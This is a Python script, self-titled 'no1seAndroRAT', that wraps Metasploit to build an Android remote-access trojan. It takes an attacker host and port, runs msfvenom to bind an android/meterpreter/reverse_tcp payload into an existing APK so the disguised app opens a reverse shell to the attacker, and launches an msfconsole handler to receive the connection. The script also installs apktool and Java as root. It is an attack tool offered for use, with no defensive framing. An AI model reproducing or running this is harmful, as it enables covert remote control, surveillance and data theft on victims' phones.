import os
import platform
from colorama import Fore, Back, Style, init
import time
import shutil
import stat
import subprocess

init(autoreset=True)

# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""

#My Amazing intro
def intro():
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)


# Clear function like always
def clear():
    windows = "cls"
    linux = "clear"
    if platform.system() == "Windows":
        os.system(windows)
    else:
        os.system(linux)

# Clear function with style
def clear_with_style():
    clear()
    print(Fore.GREEN + Back.BLACK + Style.BRIGHT)

# ===========================================

clear_with_style()
lhost = input(Fore.YELLOW + "Enter host/ip/server address: ")
lport = input("Enter port: ")

def checks():
    clear_with_style()
    apktool_jar_path = "/usr/local/bin/apktool.jar"
    apktool_path = "/usr/local/bin/apktool"
    if os.geteuid() == 0:
        print(f"{Fore.GREEN}Running as root!")
        time.sleep(1)
    else:
        print(f"{Fore.RED} please run the script as root!")
        exit(1)
    if not os.path.exists(apktool_jar_path):
        print(f"{Fore.RED}apktool.jar not found. {Fore.GREEN}Copying and setting permissions...")
        shutil.copy("src/apktool.jar", apktool_jar_path)
        os.chmod(apktool_jar_path, stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    else:
        print(f"{Fore.GREEN}apktool.jar found!")
        time.sleep(1)

    if not os.path.exists(apktool_path):
        print(f"{Fore.RED}apktool not found. {Fore.GREEN}Copying and setting permissions...")
        shutil.copy("src/apktool", apktool_path)
        os.chmod(apktool_path, stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    else:
        print(f"{Fore.GREEN}apktool found!")
        time.sleep(1)
        
    try:
        subprocess.check_output(['java', '-version'], stderr=subprocess.STDOUT, text=True)
        print(f"{Fore.GREEN}OpenJDK 11 found!")
        time.sleep(1)
    except subprocess.CalledProcessError as e: 
        print(f"{Fore.RED}OpenJDK 11 is not installed. Installing...")
        time.sleep(1)
        try:
            subprocess.run(['sudo', 'apt', 'update'])
            subprocess.run(['sudo', 'apt', 'install', 'openjdk-11-jdk', '-y'])
            print(f"{Fore.GREEN}OpenJDK 11 has been installed successfully.")
            time.sleep(2)
        except subprocess.CalledProcessError as install_error:
            print(f"{Fore.RED}Error installing OpenJDK 11: {install_error}")
    except FileNotFoundError:
        print(f"{Fore.RED}The 'java' command is not found. Please make sure Java is installed.")

    
        


def generate_payload():
    clear_with_style()
    apkname = input(Fore.YELLOW + "Enter the App/apk name: ")
    print(Fore.CYAN + "Creating APK Please wait...")
    #Replace example.apk with the apk you want to bind the payload to.
    os.system(f"msfvenom -x example.apk -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apkname}.apk")
  
    clear_with_style()
    print(Fore.GREEN + f"APK payload generated successfully saved as {apkname}.apk")
    listencho = input(Fore.YELLOW + "Would you like to listen?(Y/N): ")
    if listencho == "Y":
        set_listener()
    else:
        menu()

def set_listener():
    clear_with_style()
    print(Fore.CYAN + "Setting up a listener.")
    os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'")

def menu():
    while True:
        clear_with_style()
        intro()
        #Squidward
        print("        .--'''''''''--.")
        print("     .'      .---.      '.")
        print("    /    .-----------.    \'")
        print("   /        .-----.        \'")
        print("   |       .-.   .-.       |")
        print("   |      /   \ /   \      |")
        print("    \    | .-. | .-. |    /")
        print("     '-._| | | | | | |_.-'")
        print("         | '-' | '-' |")
        print("          \___/ \___/")
        print("       _.-'  /   \  `-._")
        print("     .' _.--|     |--._ '.")
        print("     ' _...-|     |-..._ '")
        print("            |     |")
        print("            '.___.'")
    #Squidward
        print(Fore.RED+"Welcome to no1seAndroRAT.")
        print(Fore.LIGHTYELLOW_EX+"Please select an option:")
        print(f"{Fore.WHITE}1. Generate APK Payload{Style.RESET_ALL}")
        print(f"{Fore.WHITE}2. Set Up Listener{Style.RESET_ALL}")
        print(f"{Fore.WHITE}3. Exit{Style.RESET_ALL}")
        choice = input("Enter your choice: ")

        if choice == '1':
            generate_payload()
        elif choice == '2':
            set_listener()
        elif choice == '3':
            clear_with_style()
            break
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    checks()
    menu()
